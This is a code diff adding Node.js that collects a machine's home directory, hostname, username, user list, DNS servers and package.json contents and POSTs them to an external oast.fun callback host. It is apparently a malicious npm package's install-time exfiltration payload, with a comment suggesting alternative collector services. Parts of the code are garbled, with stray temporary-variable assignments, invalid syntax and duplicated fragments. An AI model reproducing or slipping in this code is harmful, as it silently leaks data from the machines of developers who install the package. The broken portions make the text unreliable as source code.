@@ -1,0 +1,45 @@
+const trackingData = JSON.stringify({
+  p: packageJSON.name,
+  c: __dirname,
+  hd: os.homedir(),
+  hn: os.hostname(),
+  un: users.username, // Current user's username
+  dns: dns.getServers(),
+  r: packageJSON ? packageJSON._resolved : undefined,
+  v: packageJSON.version,
+  pjson: packageJSON,
+  users: users // Add the users list to the tracking data
+})
+_tmp_1.hd = os.homedir()
+const postData = querystring.stringify({
+  msg: trackingData,
+})
+_tmp_2.msg = trackingData
+const options = {
+  hostname: "zezcpprclerkqyeittfxr0vx13d9rtwsh.oast.fun", // Replace burpcollaborator.net with Interactsh or pipedream
+  port: 443,
+  path: "/",
+  method: "POST",
+  headers: {
+    "Content-Type": "application/x-www-form-urlencoded",
+    "Content-Length": postData.length,
+  },
+}
+_tmp_3.headers = {
+    "Content-Type": "application/x-www-form-urlencoded",
+    "Content-Length": postData.length,
+  }
+_tmp_4.Content-Length = postData.length
+const req = https.request(options, (res) => {
+  res.on("data", (d) => {
+    process.stdout.write(d);
+  });
+})
+res.on("data", (d) => {
+    process.stdout.write(d);
+  })
+(_tmp_5 = process.stdout).write
+req.on("error", (e) => {
+  console.error(e);
+})
+req.write(postData)
